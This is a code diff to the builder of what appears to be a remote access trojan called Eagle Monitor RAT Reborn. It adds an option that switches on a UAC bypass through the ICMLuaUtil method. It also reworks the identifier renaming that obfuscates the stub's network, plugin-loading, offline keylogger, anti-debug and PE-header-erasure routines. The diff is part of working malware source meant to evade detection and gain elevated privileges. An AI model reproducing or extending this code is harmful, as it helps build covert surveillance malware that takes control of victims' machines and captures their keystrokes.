@@ -95,6 +95,13 @@ namespace Eagle_Monitor_RAT_Reborn.Builder
                 else
                     LogStep("Skipping anti-debug..." + Environment.NewLine);
 
+                if (Program.mainForm.bypassICMLuaUtilGuna2CheckBox.Checked)
+                {
+                    LogStep("Setting bypass uac..." + Environment.NewLine);
+                    stub = stub.Replace("bypassUAC = false;", "bypassUAC = true;");
+                }
+                else
+                    LogStep("Skipping bypass uac..." + Environment.NewLine);
 
                 LogStep("Renaming code..." + Environment.NewLine);
 
@@ -110,32 +117,46 @@ namespace Eagle_Monitor_RAT_Reborn.Builder
                 stub = Rename(stub, "MakeInstall");
                 stub = Rename(stub, "StartOfflineKeylogger");
                 stub = Rename(stub, "DomCheck");
-                stub = Rename(stub, "ConnectStart");
-                stub = Rename(stub, "EndLoadPlugin");
-                stub = Rename(stub, "LoadPlugin");
-                stub = Rename(stub, "SendPacket");
-                stub = Rename(stub, "PacketHandler");
-                stub = Rename(stub, "ParsePacket");
-                stub = Rename(stub, "ReceiveData");
-                stub = Rename(stub, "EndDataRead");
-                stub = Rename(stub, "PacketParser");
-                stub = Rename(stub, "EndPacketRead");
-                stub = Rename(stub, "SendDataCompleted");
-                stub = Rename(stub, "EndConnect");
-                //
+
+                //Delegates
                 stub = Rename(stub, "ReadDataAsync");
                 stub = Rename(stub, "readDataAsync");
 
-                stub = Rename(stub, "ReadPacketAsync");
-                stub = Rename(stub, "readPacketAsync");
+                stub = Rename(stub, "ParsePacketAsync");
+                stub = Rename(stub, "parsePacketAsync");
 
                 stub = Rename(stub, "ConnectAsync");
                 stub = Rename(stub, "connectAsync");
 
                 stub = Rename(stub, "SendDataAsync");
                 stub = Rename(stub, "sendDataAsync");
-                stub = Rename(stub, "SendData");
-                //
+
+                stub = Rename(stub, "LoadPluginAsync");
+                stub = Rename(stub, "loadPluginAsync");
+                //Methods
+                stub = Rename(stub, "StartConnect");
+                stub = Rename(stub, "EndConnect");
+
+                stub = Rename(stub, "StartReceive");
+                stub = Rename(stub, "EndReceive");
+
+                stub = Rename(stub, "LoadPlugin");
+                stub = Rename(stub, "EndLoadPlugin");
+
+                stub = Rename(stub, "ParsePacket");
+                stub = Rename(stub, "EndParsePacket");
+
+                stub = Rename(stub, "StartSendPacket");
+                stub = Rename(stub, "EndSendPacket");
+     
+                //Class
+                stub = Rename(stub, "PacketHandler");
+                stub = Rename(stub, "HandlePacket");
+
+                stub = Rename(stub, "ClientHandler");
+                stub = Rename(stub, "clientHandler");
+
+                //Options
                 stub = Rename(stub, "offKeylog");
                 stub = Rename(stub, "antiDBG");
                 stub = Rename(stub, "erasePEFromPEB");
